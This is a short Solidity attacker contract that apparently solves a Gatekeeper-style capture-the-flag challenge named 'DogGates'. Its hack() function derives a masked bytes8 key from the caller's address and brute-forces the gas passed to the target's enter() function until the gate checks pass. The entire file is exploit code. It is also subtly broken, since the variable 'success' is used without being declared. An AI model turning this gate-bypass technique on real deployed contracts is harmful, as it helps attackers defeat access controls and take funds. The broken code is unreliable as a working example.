pragma solidity ^0.6.0;


import "./DogGates.sol";

contract DogGatesAttacker{
    function hack(address _gatekeeperAddr, uint256 _lowerGasBrute, uint256 _upperGasBrute) external {
        bytes8 key = bytes8(uint64(msg.sender) & 0xFFFFFFFF0000FFFF);

        uint256 bruteForce;
        for(bruteForce = _lowerGasBrute; bruteForce <= _upperGasBrute; bruteForce++){
            (success, ) = _gatekeeperAddr.call.gas(bruteForce + (8191 * 3))(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if(success){
                break;
            }
        }        
    }
}